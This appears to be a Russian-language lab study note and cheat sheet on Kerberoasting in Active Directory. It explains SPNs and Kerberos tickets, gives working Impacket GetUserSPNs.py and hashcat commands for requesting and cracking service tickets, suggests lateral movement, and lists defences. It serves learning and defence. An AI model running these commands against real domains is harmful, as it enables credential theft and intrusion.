# АТАКА: KERBEROASTING (нужна учетка)

## Что это

Kerberoasting — атака, при которой атакующий запрашивает Service Ticket (TGS) для учетных записей, имеющих зарегистрированные SPN, а затем взламывает полученный билет офлайн.

## Почему это работает

- Любой аутентифицированный пользователь домена может запросить TGS для любого SPN
- TGS зашифрован хэшем пароля сервисной учетки
- Если пароль слабый — его можно взломать офлайн (словарная атака)
- Сервисные учетки часто имеют слабые пароли и высокие привилегии


## SPN — Service Principal Name (Имя субъекта-службы)

**Что это:** Уникальный идентификатор службы в Active Directory. Используется Kerberos для привязки службы к учетной записи.

**Формат:** `тип_службы/имя_хоста`

**Примеры:**
- `cifs/fileserver.domain.local` — файловый сервер
- `http/webserver.domain.local` — веб-сервер
- `MSSQLSvc/sql.domain.local` — SQL Server

**Зачем нужен:** Без SPN Kerberos не работает, клиенты падают на NTLM.


## TGS — Ticket Granting Service (Билет на службу)

**Что это:** Билет, который позволяет клиенту подключиться к конкретной службе.

**Как получается:** Клиент отправляет TGT + SPN на KDC, получает TGS.

**Особенность:** TGS зашифрован хэшем пароля учетной записи, под которой работает служба.

**Что делает атакующий:** Запрашивает TGS для SPN, выгружает его и взламывает офлайн.


## KDC — Key Distribution Center (Центр распределения ключей)

**Что это:** Служба на Domain Controller, которая выдает билеты Kerberos.

**Состоит из:**
- **AS (Authentication Service)** — выдает TGT (первичный билет)
- **TGS (Ticket Granting Service)** — выдает TGS (билеты на службы)

---

## Кто цель атаки

- Учетные записи с зарегистрированными SPN (службы, приложения, БД)
- Примеры: `svc_printer`, `sql_service`, `http_service`, `backup_svc`

**Важно:** Обычные пользователи без SPN не являются целью (у них нет TGS для запроса).

---

## Как найти SPN в домене

```bash
GetUserSPNs.py домен/пользователь:пароль -dc-ip IP_DC -request
```

**Что делает скрипт:**
1. Подключается к LDAP
2. Ищет учетки с атрибутом `servicePrincipalName`
3. Запрашивает TGS для каждой
4. Выводит билеты в формате для взлома

---

## Пример команды

```bash
GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request
```

---

## Формат билета для взлома

```
$krb5tgs$23$*svc_printer$THM.LOC$...
```

- `$krb5tgs$23$` — тип билета (Kerberos 5 TGS, RC4)
- `svc_printer` — имя учетки
- `THM.LOC` — домен

---

## Взлом через Hashcat

```bash
hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt
```

---

## Режимы Hashcat для Kerberos

| Режим | Описание |
|-------|----------|
| **13100** | Kerberos 5 TGS-REP (RC4) — самый частый |
| **19600** | Kerberos 5 TGS-REP (AES) — реже |

**Важно:** RC4 слабее и быстрее взламывается. Если сервис поддерживает AES, используется AES.

---

## Что делать с результатом

- Использовать пароль для аутентификации
- Часто сервисные учетки имеют права на несколько серверов
- Попробовать подключиться через SMB, WinRM, RDP, SSH

---

## Защита от Kerberoasting

- Длинные пароли для сервисных учеток (30+ символов)
- Использовать **gMSA (Group Managed Service Accounts)** — пароли ротируются автоматически
- Регулярная смена паролей
- Мониторинг аномальных запросов TGS (много от одного пользователя)

---

## Расшифровка ключевых терминов

| Термин | Расшифровка | Что означает |
|--------|-------------|--------------|
| **SPN** | Service Principal Name | Идентификатор службы в AD |
| **TGS** | Ticket Granting Service | Билет на конкретную службу |
| **KDC** | Key Distribution Center | Служба выдачи билетов на DC |
| **AS** | Authentication Service | Выдает TGT |
| **RC4** | Rivest Cipher 4 | Алгоритм шифрования (слабый) |
| **AES** | Advanced Encryption Standard | Алгоритм шифрования (сильный) |
| **gMSA** | Group Managed Service Account | Учетка с автоматической ротацией пароля |
| **TGT** | Ticket Granting Ticket | Первичный билет для получения TGS |


## Шпаргалка

```bash
# Найти SPN и запросить билеты
GetUserSPNs.py DOMAIN/user:pass@DC_IP -request

# Запросить билет для конкретного пользователя
GetUserSPNs.py DOMAIN/user:pass@DC_IP -request-user svc_account

# Взломать билет
hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt

# Взломать с правилами (увеличивает шансы)
hashcat -m 13100 ticket.txt rockyou.txt -r best64.rule
```